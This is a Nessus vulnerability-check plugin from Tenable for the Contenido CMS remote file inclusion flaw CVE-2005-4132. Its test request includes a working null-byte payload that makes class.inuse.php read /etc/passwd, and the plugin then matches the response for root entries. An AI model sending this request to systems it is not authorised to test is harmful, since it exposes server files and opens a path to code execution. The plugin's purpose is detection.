#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to a
remote file inclusion vulnerability. 

Description :

The remote host appears to be running Contenido, an open-source
content management system written in PHP. 

The version of Contenido installed on the remote host fails to
sanitize input to the 'cfg[path][contenido]' and 'cfg[path][classes]'
parameters of the 'contenido/classes/class.inuse.php' script before
using it in a PHP 'require_once' function.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this flaw to read arbitrary files on the remote
host and or run arbitrary code, possibly taken from third-party hosts,
subject to the privileges of the web server user id. 

See also :

http://sourceforge.net/forum/forum.php?forum_id=518356

Solution :

Upgrade to Contenido 4.6.4 or later.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20292);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-4132");
  script_bugtraq_id(15790);
  script_xref(name:"OSVDB", value:"27484");

  script_name(english:"Contenido cfg Parameter Remote File Include Vulnerability");
  script_summary(english:"Checks for cfg parameter remote file include vulnerability in Contenido");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/contenido", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd";
  req = http_get(
    item:string(
      dir, "/contenido/classes/class.inuse.php?",
      "cfg[path][contenido]=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(pattern:"/etc/passwd.+failed to open stream", string:res) ||
    "Failed opening required '/etc/passwd" >< res
  ) {
    if (report_verbosity > 0) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        res
      );
    }
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
